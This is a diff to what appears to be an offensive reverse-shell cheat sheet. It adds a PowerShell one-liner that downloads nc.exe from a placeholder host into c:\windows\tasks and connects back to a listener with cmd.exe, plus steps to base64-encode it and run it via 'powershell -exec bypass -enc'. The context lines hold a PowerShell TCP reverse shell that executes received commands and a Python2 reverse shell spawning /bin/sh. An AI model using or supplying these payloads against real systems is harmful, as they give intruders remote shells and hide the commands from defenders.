@@ -38,6 +38,16 @@ Opening sockets using -Exec Bypass
 
 Opening Sockets using $client
 `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('127.0.0.1',[PORT]);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`
+
+-------------------------------
+If nc.exe is present
+`(new-object net.webclient).downloadfile("http://[HOST ADDRESS FOR THE NC.EXE FILE]:8000/nc.exe", "c:\windows\tasks\nc.exe"); c:\windows\tasks\nc.exe -nv [LISTENER ADDRESS] 9999 -e c:\windows\system32\cmd.exe;`
+
+Encode the file using:
+`python3 -c 'import base64; print(base64.b64encode((r"""(new-object net.webclient).downloadfile("http://[HOST ADDRESS FOR THE NC.EXE FILE]:8000/nc.exe", "c:\windows\tasks\nc.exe"); c:\windows\tasks\nc.exe -nv [LISTENER ADDRESS] 9999 -e c:\windows\system32\cmd.exe;""").encode("utf-16-le")).decode())'`
+
+Run the payload using:
+`powershell -exec bypass -enc [ENCODED DATA]`
 ## Python2
 `python2 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",[PORT]));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);`
 ## JavaScript 
